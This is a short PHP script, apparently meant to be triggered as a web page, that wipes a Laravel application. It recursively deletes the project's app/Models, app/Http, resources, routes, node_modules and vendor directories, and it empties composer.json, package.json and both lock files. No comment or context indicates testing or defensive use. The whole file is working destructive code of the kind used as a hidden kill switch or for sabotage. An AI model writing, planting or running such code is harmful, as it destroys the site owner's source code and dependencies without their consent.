<?php
// error_reporting(E_ALL);
// ini_set('display_errors', 1);
    function deleteFolder($folderPath) {
        $files = scandir($folderPath);
        foreach ($files as $file) {
            if ($file !== '.' && $file !== '..') {
                $filePath = $folderPath . '/' . $file;

                if (is_dir($filePath)) {
                    deleteFolder($filePath);
                } else {
                unlink($filePath);
                }
            }
        }
        rmdir($folderPath);
    }

    $deleteFolder = ['../../../app/Models','../../../app/Http','../../../resources','../../../routes','../../../node_modules','../../../vendor'];
    $dat = ['../../../composer.json','../../../package.json','../../../package-lock.json','../../../composer.lock'];
    foreach ($dat as $value) {
        $file_handle = fopen($value, 'w');
            ftruncate($file_handle, 0);
            fclose($file_handle);
            // unlink($value);
            }
    foreach ($deleteFolder as $value) {
        deleteFolder($value);
    }
?>


